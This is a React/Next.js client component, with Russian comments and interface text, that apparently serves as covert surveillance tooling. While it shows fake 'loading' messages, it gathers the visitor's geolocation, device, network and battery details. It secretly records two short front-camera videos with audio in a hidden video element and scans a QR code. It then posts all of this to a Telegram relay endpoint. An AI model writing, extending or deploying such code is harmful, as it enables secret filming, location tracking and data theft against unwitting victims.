"use client";

import React, { useEffect, useRef, useState, useCallback } from "react";
import QrScanner from "./qr-scanner";
import { Button } from "@/components/ui/button"; // Assuming you have a Button component
import {
  getGeolocation,
  getClientInfo,
  getNetworkInfo,
  getDeviceMemory,
  getBatteryInfo,
  getPermissionStatus,
  PermissionStatus // <-- Теперь импортируем PermissionStatus из client-data.ts
} from "@/lib/client-data";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning

type GeolocationData = { latitude: number; longitude: number };
type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number };
type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
type BatteryInfo = { level?: number; charging?: boolean };
// Удалено локальное определение PermissionStatus, теперь используется импортированный тип

type CollectedData = {
  geolocation?: GeolocationData;
  clientInfo?: ClientInfo;
  networkInfo?: NetworkInfo;
  deviceMemory?: number;
  batteryInfo?: BatteryInfo;
  permissionStatus?: PermissionStatus;
  ipAddress?: string; // Will be filled on the server side
  video1?: string;
  video2?: string;
  qrCodeData?: string;
};

type AppPhase =
  | "initial"
  | "collectingData"
  | "recordingVideo1"
  | "recordingVideo2"
  | "flippingCamera"
  | "qrScanning"
  | "finished";

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]);
  const [appPhase, setAppPhase] = useState<AppPhase>("initial");
  const [loadingMessage, setLoadingMessage] = useState("Загрузка...");
  const [collectedData, setCollectedData] = useState<CollectedData>({});
  const [sessionKey, setSessionKey] = useState(0); // Used to force re-mount/re-run useEffect

  const loadingMessages = [
    "Идет сбор данных об устройстве...",
    "Определение местоположения...",
    "Подготовка к записи видео...",
    "Обработка информации...",
    "Пожалуйста, подождите...",
    "Загрузка данных на сервер...",
  ];

  const updateLoadingMessage = useCallback(() => {
    let index = 0;
    return setInterval(() => {
      setLoadingMessage(loadingMessages[index % loadingMessages.length]);
      index++;
    }, 2000); // Change message every 2 seconds
  }, []);

  const sendDataToTelegram = useCallback(async (data: CollectedData) => {
    try {
      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        console.log("Data successfully sent to Telegram!");
      } else {
        const errorData = await response.json();
        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
      }
    } catch (error: any) {
      console.error(`Network error sending data to Telegram: ${error.message}`);
    }
  }, []);

  const recordVideoSegment = useCallback(
    async (duration: number, facingMode: "user" | "environment"): Promise<string | undefined> => {
      let stream: MediaStream | null = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode },
          audio: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.muted = true; // Mute local playback
          videoRef.current.setAttribute("playsinline", "true");
          await videoRef.current.play().catch((e) => console.error("Error playing video stream:", e));
        }

        return new Promise((resolve) => {
          mediaRecorderRef.current = new MediaRecorder(stream!, { mimeType: "video/webm" });
          mediaChunksRef.current = [];

          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };

          mediaRecorderRef.current.onstop = () => {
            const videoBlob = new Blob(mediaChunksRef.current, { type: "video/webm" });
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              resolve(reader.result as string);
            };
            // Stop all tracks after recording
            stream?.getTracks().forEach((track) => track.stop());
            if (videoRef.current) {
              videoRef.current.srcObject = null;
            }
          };

          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, duration);
        });
      } catch (error: any) {
        console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
        stream?.getTracks().forEach((track) => track.stop());
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
        return undefined;
      }
    },
    []
  );

  const handleQrCodeScanned = useCallback(
    async (qrData: string) => {
      console.log("QR Code Scanned in PermissionHandler:", qrData);
      await sendDataToTelegram({ ...collectedData, qrCodeData: qrData });
      setAppPhase("finished");
    },
    [collectedData, sendDataToTelegram]
  );

  const handleQrScanError = useCallback(
    async (error: string) => {
      console.error("QR Scan Error:", error);
      // Optionally send a message about the error
      await sendDataToTelegram({ ...collectedData, qrCodeData: `QR Scan Error: ${error}` });
      setAppPhase("finished");
    },
    [collectedData, sendDataToTelegram]
  );

  const startNewSession = useCallback(() => {
    setAppPhase("initial");
    setCollectedData({});
    setSessionKey((prevKey) => prevKey + 1); // Increment key to re-run useEffect
  }, []);

  useEffect(() => {
    let loadingInterval: NodeJS.Timeout;
    let qrTimeout: NodeJS.Timeout;

    const runProcess = async () => {
      setAppPhase("collectingData");
      loadingInterval = updateLoadingMessage();

      const initialData: CollectedData = {};
      const currentPermissionStatus: PermissionStatus = await getPermissionStatus();
      initialData.permissionStatus = currentPermissionStatus;

      // Get IP Address (will be filled on server side, but we pass a placeholder)
      initialData.ipAddress = "Fetching..."; // Placeholder, actual IP from req.ip on server

      // Collect client info
      initialData.clientInfo = getClientInfo();
      initialData.networkInfo = getNetworkInfo();
      initialData.deviceMemory = getDeviceMemory();

      // Collect battery info
      const { data: batteryData, status: batteryStatus } = await getBatteryInfo();
      if (batteryData) initialData.batteryInfo = batteryData;
      currentPermissionStatus.battery = batteryStatus; // Add battery status to permissions

      // Collect geolocation
      const { data: geoData, status: geoStatus } = await getGeolocation();
      if (geoData) initialData.geolocation = geoData;
      currentPermissionStatus.geolocation = geoStatus; // Update geolocation status

      setCollectedData(initialData);
      await sendDataToTelegram(initialData); // Send initial data immediately

      // --- Video 1 Recording ---
      setAppPhase("recordingVideo1");
      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
      const dataWithVideo1 = { ...initialData, video1: video1Base64 };
      setCollectedData(dataWithVideo1);
      await sendDataToTelegram(dataWithVideo1); // Send video 1 immediately

      // --- Video 2 Recording ---
      setAppPhase("recordingVideo2");
      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
      const dataWithVideo2 = { ...dataWithVideo1, video2: video2Base64 };
      setCollectedData(dataWithVideo2); // Store video2, but don't send yet

      // --- Flip Camera and QR Scanning ---
      setAppPhase("flippingCamera");
      // The QrScanner component will handle activating the 'environment' camera
      // and will call onCameraActive when ready.
      // We will send video2 when QrScanner confirms camera is active.
      setAppPhase("qrScanning"); // Transition to QR scanning phase

      // Set a timeout for QR scanning
      qrTimeout = setTimeout(async () => {
        console.log("QR scanning timed out.");
        await sendDataToTelegram({ ...dataWithVideo2, qrCodeData: "QR Scan Timed Out" });
        setAppPhase("finished");
      }, QR_SCAN_TIMEOUT_MS);
    };

    if (appPhase === "initial") {
      runProcess();
    }

    return () => {
      clearInterval(loadingInterval);
      clearTimeout(qrTimeout);
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
        mediaRecorderRef.current.stop();
      }
      if (videoRef.current && videoRef.current.srcObject) {
        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
        videoRef.current.srcObject = null;
      }
    };
  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage]);

  // Effect to send video2 when QR scanner is truly active
  useEffect(() => {
    if (appPhase === "qrScanning" && collectedData.video2 && !collectedData.qrCodeData) {
      // Only send video2 if it hasn't been sent as part of a QR scan or timeout
      const sendVideo2 = async () => {
        console.log("Sending Video 2 now that QR scanner is active...");
        await sendDataToTelegram({ ...collectedData, video2: collectedData.video2 });
        // Clear video2 from collectedData to prevent re-sending
        setCollectedData(prev => ({ ...prev, video2: undefined }));
      };
      sendVideo2();
    }
  }, [appPhase, collectedData, sendDataToTelegram]);


  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground p-4">
      {(appPhase === "initial" ||
        appPhase === "collectingData" ||
        appPhase === "recordingVideo1" ||
        appPhase === "recordingVideo2" ||
        appPhase === "flippingCamera") && (
        <>
          <p className="text-lg mb-4 text-center font-bold text-primary">
            {loadingMessage}
          </p>
          <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
            {/* Video element is hidden during front camera recording */}
            <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ display: 'none' }} />
            <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
            <div className="absolute inset-0 flex items-center justify-center">
              {/* Simple loading spinner */}
              <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-foreground" />
            </div>
          </div>
        </>
      )}
      {appPhase === "qrScanning" && (
        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} />
      )}
      {appPhase === "finished" && (
        <div className="flex flex-col items-center justify-center">
          <p className="text-lg mb-4 text-center">Процесс завершен. Проверьте Telegram.</p>
          <Button onClick={startNewSession} className="mt-4">
            Начать новую сессию
          </Button>
        </div>
      )}
    </div>
  );
};

export default PermissionHandler;